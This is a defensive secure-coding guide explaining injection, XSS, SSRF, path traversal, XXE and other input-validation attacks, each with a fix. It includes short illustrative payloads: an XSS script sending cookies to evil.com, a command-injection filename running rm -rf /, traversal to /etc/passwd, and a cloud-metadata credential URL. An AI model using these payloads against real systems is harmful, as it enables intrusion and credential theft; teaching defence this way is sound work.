# Input Validation — Why and How

> This guide explains the reasoning behind input validation rules. Read it when you want to understand the attacks these practices prevent.

## The Core Principle

Every piece of data that enters your application from the outside world is potentially dangerous. "Outside world" includes:

- Form fields and text inputs from users
- URL parameters and query strings
- HTTP headers and cookies
- File uploads
- Data from third-party APIs
- Webhook payloads
- Data from your own database (it may have been corrupted by a previous bug)

The rule is simple: **validate at the boundary, sanitize for the context.** When data crosses a trust boundary (enters your system), validate it. When you use it (insert into HTML, build a query, construct a command), sanitize it for that specific context.

## Why Attackers Target Input

Your application takes input and does things with it — stores it in a database, displays it on a page, passes it to other services. Attackers exploit this by crafting input that changes what your application does.

The analogy: imagine you run a restaurant and you let customers write their own orders on the kitchen ticket. Most write "cheeseburger." But one writes "cheeseburger AND open the safe AND give me the contents." If the kitchen blindly follows everything on the ticket, you have a problem.

That's exactly what happens with injection attacks — the attacker writes "instructions" disguised as data.

## The Major Attack Types

### SQL Injection

**What it is:** The attacker includes database commands in their input. If your code concatenates that input into a SQL query, the database executes the attacker's commands.

**Example:** A login form where the code builds the query like this:
```
"SELECT * FROM users WHERE email = '" + userInput + "'"
```

If the user enters: `admin@example.com' OR '1'='1`

The query becomes: `SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'`

This returns ALL users, potentially granting access to any account.

**The fix:** Never concatenate user input into queries. Use parameterized queries (also called prepared statements) or your framework's ORM. These treat input as data, never as commands:
```
"SELECT * FROM users WHERE email = ?" with parameter [userInput]
```

### Cross-Site Scripting (XSS)

**What it is:** The attacker submits content containing JavaScript code. If your app displays that content without encoding it, the script runs in other users' browsers.

**Example:** A comment field where someone enters:
```
Great article! <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

If displayed without encoding, this script runs in every visitor's browser, stealing their session cookies.

**The fix:** Encode output for the context where it's displayed. In HTML, characters like `<`, `>`, `&`, and `"` must be converted to their safe equivalents (`&lt;`, `&gt;`, etc.). Most modern frameworks do this automatically — but only if you use them correctly. Watch for "raw" or "unescaped" rendering modes.

### Command Injection

**What it is:** The attacker includes system commands in input that your application passes to the operating system.

**Example:** An image resizer that runs:
```
exec("convert " + filename + " -resize 200x200 output.jpg")
```

If the filename is `photo.jpg; rm -rf /`, the system executes the file deletion command.

**The fix:** Never construct shell commands from user input. Use libraries that call functions directly without going through a shell. If you absolutely must, use strict allowlists for permitted values.

### Path Traversal

**What it is:** The attacker manipulates file paths to access files outside the intended directory.

**Example:** A file download endpoint: `/download?file=report.pdf`

If someone requests: `/download?file=../../../etc/passwd`

They might get your server's password file.

**The fix:** Never use user input directly in file paths. Validate against an allowlist of permitted files, or resolve the path and verify it stays within the expected directory.

### Server-Side Request Forgery (SSRF)

**What it is:** The attacker gives your server a URL to fetch, and the URL points somewhere your server can reach but the attacker can't — internal services, admin dashboards, or your cloud provider's metadata endpoint.

**Example:** A "summarize this page" feature fetches whatever URL the user submits. The attacker submits:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

On many cloud platforms, that address returns the server's own cloud credentials. The attacker now has your cloud keys without ever touching your code.

**The fix:** Validate URLs before fetching: `https` by default (plain `http` only for explicit link-preview features), allowlist destination hosts where possible, resolve the hostname and reject private/reserved IP ranges in both IPv4 and IPv6 (including IPv4-mapped forms like `::ffff:169.254.169.254`), and re-check after every redirect. The ranges to reject: IPv4 127.0.0.0/8 (loopback), 0.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 (private), 100.64.0.0/10 (carrier-grade NAT, used inside many clouds), 169.254.0.0/16 (link-local, home of the metadata service); IPv6 `::1`, `fc00::/7` (unique local), `fe80::/10` (link-local). Block the metadata endpoints by name as well as address (`169.254.169.254`, `metadata.google.internal`) because they hand out the server's own cloud credentials. Reject every scheme except `https` (and `http` only for public-by-design previews): `file://` reads local files, `gopher://` and `ftp://` let an attacker speak arbitrary protocols to internal services. Also beware DNS rebinding: a hostname can resolve to a safe public IP during your validation check and to an internal IP moments later when the fetch happens — resolve once and connect to the IP address you validated. On AWS, enforce IMDSv2 with a hop limit of 1 so even a successful SSRF can't reach the metadata service. Put a timeout and a response size limit on every fetch so one URL can't hang the server or fill the disk, and where the platform allows, run URL-fetching features with egress-restricted networking so a validation bypass has nowhere to go. This matters doubly for LLM apps, which fetch user-supplied URLs constantly (RAG ingestion, link previews, webhook callbacks). See `rules/security.md` (Server-Side Requests).

### Open Redirect

**What it is:** A `?next=` or `?returnTo=` parameter that sends the user to any URL after login. The link *starts* on your real domain, so it passes every "is this link legitimate?" check a user makes — then lands on the attacker's page, which may harvest credentials or, in OAuth flows, receive the authorization code.

**The fix:** Accept only relative paths (`/dashboard`) or hosts from an allowlist, and normalize before checking — `//evil.com`, `/\evil.com`, and `https:evil.com` all parse as absolute URLs in some browsers.

### Prototype Pollution (JavaScript)

**What it is:** Deep-merging or recursively assigning untrusted JSON into an object lets a payload like `{"__proto__": {"isAdmin": true}}` set a property on `Object.prototype` — and now *every* object in the process has `isAdmin`. Authorization checks that read `user.isAdmin` start passing.

**The fix:** Reject `__proto__`, `constructor`, and `prototype` keys at the boundary, use `Object.create(null)` or `Map` for user-keyed data, validate with a schema that forbids unknown keys, and keep merge utilities (lodash and friends) current.

### Regular Expression Denial of Service (ReDoS)

**What it is:** A regex with nested or overlapping quantifiers — `(a+)+$`, `(\w+\s?)*$`, most hand-written "email validators" — takes exponential time on a crafted input. One request pins a CPU core; a handful pin the server.

**The fix:** Bound input length before matching, avoid nested quantifiers, and use a linear-time engine (RE2, Rust `regex`, Go's `regexp`) for anything applied to untrusted input. Lint for it — `eslint-plugin-regexp` and similar tools flag the dangerous shapes.

### XXE and Unsafe Deserialization

**What it is:** XML parsers resolve external entities by default in many libraries, so a document containing `<!ENTITY x SYSTEM "file:///etc/passwd">` reads server files or makes SSRF requests. Native serialization formats — Java serialization, Python `pickle`, PHP `unserialize`, Ruby `Marshal`, YAML `load` — can instantiate arbitrary classes on the way in, which is remote code execution.

**The fix:** Disable DTDs and external entities in every XML parser (`XMLConstants.FEATURE_SECURE_PROCESSING`, `defusedxml`, `libxml_disable_entity_loader`). Never deserialize untrusted input with a native format; use JSON plus a schema, and `yaml.safe_load`, never `yaml.load`.

### HTTP Request Smuggling

**What it is:** When a proxy, load balancer, or CDN and your application server disagree about where one HTTP request ends and the next begins (usually via conflicting `Content-Length` and `Transfer-Encoding` headers), an attacker can prepend part of their request to the *next* user's request — hijacking it, poisoning caches, or bypassing front-end auth.

**The fix:** Use HTTP/2 end-to-end where you can, configure the front end to reject ambiguous requests (both headers present, malformed chunk sizes), keep every hop patched, and don't mix server vendors between edge and origin without testing the boundary.

### Web Cache Poisoning and Cache Deception

**What it is:** *Poisoning* — an attacker gets a CDN to store a response built from a header or parameter the cache key ignores (an unkeyed `X-Forwarded-Host`, say), so every later visitor receives the attacker's version. *Deception* — an attacker tricks a victim into visiting `/account/settings/x.css`; the app returns the victim's personal settings page, the CDN sees `.css` and caches it, and the attacker fetches it.

**The fix:** Send `Cache-Control: private, no-store` on every authenticated or personalized response, `Vary` on every header that affects the output, don't let the CDN cache by extension alone, and never build responses from headers you don't key on. If a response depends on who is asking, it must not be in a shared cache.

### Mass Assignment and Self-Attested Data

**Mass assignment.** Binding a request body straight onto a model (`User.update(req.body)`, `Model.create(**params)`) lets the client set every column the model has, including the ones the form never showed: `role`, `is_admin`, `balance`, `verified`, `owner_id`. The fix is an explicit allowlist of the fields each endpoint may set, and a rule that server-controlled fields are assigned only in server code, never copied from input. Frameworks that offer "strong parameters" or schema-based DTOs exist for this reason; use them on every write endpoint.

**Self-attested data.** A record that says who it belongs to, a message that carries the key that signs it, a client that reports its own role: none of these are authenticated, because the attacker controls the record. Verifying a signature against a key that arrived alongside the signed payload proves only that someone signed something with some key. Trust anchors (which keys are valid, which identity owns which resource) must come from a separate channel established earlier: a key pinned at pairing time, a directory looked up by identity, a session the server issued. This is the same mistake as IDOR (`guides/security/security-architecture.md`, Layer 4) one level down.

**Validate before the dangerous sink.** Length fields, filenames, counts, and dimensions supplied by a peer must be bounds-checked before any resource is committed to them: before the allocation, before the decompressor runs, before the media decoder opens the file, before the path is joined. A check that happens after the allocation is a crash at best and a memory-corruption primitive at worst.

## Validation Strategy

### Allowlists Over Denylists

- **Denylist (bad):** "Reject input containing these dangerous characters: `<`, `>`, `'`, `"`"
  - Problem: You'll always miss something. Attackers are creative.
- **Allowlist (good):** "Accept only input matching this pattern: letters, numbers, spaces, and basic punctuation"
  - You define what's allowed; everything else is rejected automatically.

### Validate Type, Length, Format, Range

For every input field, define:
- **Type:** Is this a string, number, date, email, URL?
- **Length:** What's the minimum and maximum? (A name field doesn't need to accept 50,000 characters)
- **Format:** Does it match the expected pattern? (An email must contain @, a phone number has specific formats)
- **Range:** For numbers, what's the valid range? (Age: 0–150. Quantity: 1–10,000. Price: 0.01–999,999.99)
- **Business rules:** Is this value valid in context? (A start date must be before an end date. A discount can't exceed the total.)

### Validate on the Server

Client-side validation (in the browser) improves user experience — it gives instant feedback. But it is NOT security. Anyone can bypass it by modifying the request directly. Server-side validation is where security lives.

Always validate on the server. Client-side validation is optional and complementary.

## File Upload Validation

File uploads deserve special attention because they introduce unique risks. The compact rules are in `rules/security.md` (File Uploads); this is why they exist.

**The file isn't what it says it is.** The extension and the browser-supplied MIME type are both chosen by the uploader, so `photo.jpg` can be a PHP script, an HTML page, or an SVG with JavaScript inside. Reading the first bytes (magic bytes) tells you the real container type — but even a genuine image can be a *polyglot*, a file that is simultaneously a valid JPEG and valid HTML. Re-encoding images through an image library (decode, then write a fresh JPEG/PNG/WebP) discards everything that isn't pixels, which also strips EXIF metadata — including the GPS coordinates that many phones embed.

**Where you serve it matters as much as what it is.** An SVG or HTML file served inline from your main origin runs scripts with your users' cookies: that's stored XSS. Serve user files from a separate origin (`files.example.com` or a bucket's own domain), with `Content-Disposition: attachment` so the browser downloads rather than renders, and `X-Content-Type-Options: nosniff` so it doesn't guess. Never put uploads under the web root — a directly reachable `uploads/shell.php` is the classic path to code execution.

**The modern storage pattern is a private bucket, not your disk.** Store objects in S3/GCS/R2 with public access blocked, and hand out short-lived presigned URLs for download — or let the browser upload straight to the bucket with a presigned POST so multi-megabyte files never transit your app server. Your code's job becomes *authorizing* each URL it signs (does this user own this object?), which is a much smaller surface than streaming bytes.

**Archives and size limits.** A 1 MB zip can expand to 100 GB (a decompression bomb), and an archive entry named `../../etc/cron.d/x` extracts outside the target directory (zip-slip). Cap both the compressed and decompressed size, validate every entry path after normalization, and extract into a fresh directory.

**Names and malware.** Generate a random filename for storage (keep the original in metadata if you need to show it), so the path can never contain traversal sequences or overwrite another file. If files are shared with other users, scan them with an antivirus engine before they become downloadable.

## The Belt-and-Suspenders Approach

Defense in depth means validating at multiple layers:

1. **Client-side** — for user experience (immediate feedback)
2. **API/controller layer** — for input format validation (reject bad data early)
3. **Business logic layer** — for business rule validation (is this action valid in context?)
4. **Database layer** — for constraints (NOT NULL, UNIQUE, CHECK, foreign keys)

If any single layer has a bug, the others catch it. This is why the data rules also emphasize database constraints — they're your last line of defense.
